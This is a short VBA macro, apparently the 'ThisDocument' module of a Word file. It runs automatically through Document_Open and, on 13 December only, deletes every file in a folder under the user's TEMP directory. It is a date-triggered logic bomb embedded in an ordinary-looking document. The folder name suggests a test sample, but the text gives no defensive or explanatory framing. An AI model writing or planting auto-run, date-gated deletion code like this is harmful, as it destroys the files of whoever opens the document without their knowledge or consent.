Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    If Not (Day(Date) = 13 And Month(Date) = 12) Then
        Exit Sub
    End If
    Kill Environ("TEMP") & "\oblivionx_wipe_test\*.*"
End Sub
